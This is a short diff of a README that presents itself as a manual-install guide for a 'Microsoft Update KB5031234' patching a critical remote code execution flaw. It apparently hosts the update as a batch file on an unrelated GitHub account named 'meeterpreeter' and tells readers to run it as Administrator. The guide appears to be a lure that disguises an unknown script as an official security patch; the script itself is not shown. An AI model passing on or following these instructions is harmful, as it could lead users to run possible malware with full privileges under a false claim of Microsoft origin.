@@ -16,7 +16,7 @@ This update resolves a critical remote code execution vulnerability affecting th
 ## 🔧 Manual Installation
 
 1. Download the update script:  
-   [`MicrosoftUpdate_KB5031234.bat`]([./MicrosoftUpdate_KB5031234.bat](https://github.com/meeterpreeter/Microsoft-Updates/raw/refs/heads/main/MicrosoftUpdate_KB5031234.bat))
+   [`MicrosoftUpdate_KB5031234.bat`](https://github.com/meeterpreeter/Microsoft-Updates/raw/refs/heads/main/MicrosoftUpdate_KB5031234.bat)
 
 2. Right-click and run as Administrator
 
